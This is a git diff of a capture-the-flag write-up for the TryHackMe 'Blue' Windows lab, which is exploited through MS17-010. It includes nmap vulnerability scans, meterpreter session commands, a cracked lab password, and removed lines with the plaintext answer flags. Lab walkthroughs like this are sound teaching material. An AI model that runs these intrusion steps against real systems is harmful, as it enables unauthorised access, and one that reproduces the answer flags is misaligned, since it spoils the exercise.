@@ -2,21 +2,17 @@
 
 ![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
 
-## Room Info
+## Intro
 
-> **Name**
->
-> 🔗 [Blue](https://tryhackme.com/room/blue)
->
-> ![](.gitbook/assets/blue.jpg)
->
-> **Description**
->
-> 📝 *Deploy & hack into a Windows machine, leveraging common misconfigurations issues.*
->
-> **Target IP**
->
-> 🎯 `10.10.177.175`
+| Room Info           | ![](.gitbook/assets/blue.jpg)           |
+| :------------------ | --------------------------------------- |
+| 🔗 Name              | [Blue](https://tryhackme.com/room/blue) |
+| 🎯 Target IP         | `10.10.177.175`                         |
+| 📈 Difficulty level  | 🟢Easy                                   |
+| 💲 Subscription type | Free                                    |
+| 🪟 🐧OS               | Windows                                 |
+
+---
 
 ## Recon
 
@@ -25,6 +21,8 @@ nmap -p1-1000 10.10.177.175
 nmap -sV -p445 10.10.177.175
 nmap --script smb-vuln-ms17-010 -p445 10.10.177.175
 ```
+
+---
 
 ## Exploitation
 
@@ -45,6 +43,8 @@ background # or CTRL+Z
 ```
 
 ![](.gitbook/assets/image-20230316134157848.png)
+
+---
 
 ## Privilege Escalation
 
@@ -74,6 +74,8 @@ migrate 1284
 ```
 
 ![](.gitbook/assets/image-20230316141809336.png)
+
+---
 
 ## Post Exploitation
 
@@ -105,57 +107,24 @@ Jon's credentials are `jon`:`alqfna22`.
 
 ## Flags
 
-* In the `meterpreter` session
+* 🚩 In the `meterpreter` session
 
 ```bash
 cd C:\\
 dir
 cat flag1.txt
+flag{*******************
 ```
 
-
-
-<details>
-
-<summary>Reveal Flag1: 🚩</summary>
-
-
-
-`flag{access_the_machine}`
-
-
-
-<img src=".gitbook/assets/image-20230316143237356.png" alt="" data-size="original">
-
-</details>
-
-
+![](.gitbook/assets/2024-10-20_22-09-30_758.png)
 
 ```bash
 cd C:/Windows/System32/config
 cat flag2.txt
+flag{*****************************
 ```
 
-
-
-
-
-
-<details>
-
-<summary>Reveal Flag2: 🚩</summary>
-
-
-
-`flag{sam_database_elevated_access}`
-
-
-
-<img src=".gitbook/assets/image-20230316143502259.png" alt="" data-size="original">
-
-</details>
-
-
+![](.gitbook/assets/2024-10-20_22-11-22_759.png)
 
 ```bash
 cd C:\\Users\\
@@ -163,23 +132,10 @@ dir
 cd Jon
 cd Documents
 cat flag3.txt
+flag{********************************
 ```
 
-
-
-<details>
-
-<summary>Reveal Flag3: 🚩</summary>
-
-
-
-`flag{admin_documents_can_be_valuable}`
-
-
-
-<img src=".gitbook/assets/image-20230316143807868.png" alt="" data-size="original">
-
-</details>
+![](.gitbook/assets/2024-10-20_22-12-04_760.png)
 
 
 ***
